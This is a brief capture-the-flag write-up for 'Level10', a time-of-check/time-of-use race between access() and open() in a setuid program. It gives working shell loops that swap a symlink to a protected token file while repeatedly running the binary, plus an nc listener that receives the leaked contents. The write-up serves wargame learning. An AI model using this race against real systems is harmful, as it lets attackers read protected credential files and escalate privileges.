
# Level10

```bash
ltrace ./level10 token 127.0.0.1
```

It is a race condition. You do the access(), then you do the open(). In the small time between the two calls, the file may have changed. Typically, the file is, say, /tmp/foo. Initially, the file is owned by some user (who is the bad guy of the story), and the target is some root-powered application. The application does the access(), sees that the file really belongs to the user, and thus thinks: "that's fine, it's his file, I can process it on his behalf". Then the bad guy quickly replaces the file with a symbolic link to /etc/shadow. The application has already taken the decision to open /tmp/foo, but when it does, it really opens and processes /etc/shadow.

```bash
nc -k -l localhost 6969
```

```bash
touch /tmp/bad
chmod 777 /tmp/bad

while [ 1 ]
do
 ln -s /tmp/bad /tmp/link
 ln -s /home/user/level10/token /tmp/link
done
```

```bash
while [ 1 ]
do
 /home/user/level10/level10 /tmp/link 127.0.0.1
done
```
